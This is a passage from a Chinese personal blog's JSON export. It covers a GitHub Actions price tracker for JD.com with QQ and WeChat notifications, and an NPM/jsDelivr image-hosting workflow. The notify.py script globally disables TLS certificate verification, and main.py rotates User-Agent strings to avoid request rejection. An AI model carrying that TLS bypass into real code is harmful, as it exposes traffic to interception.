src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span 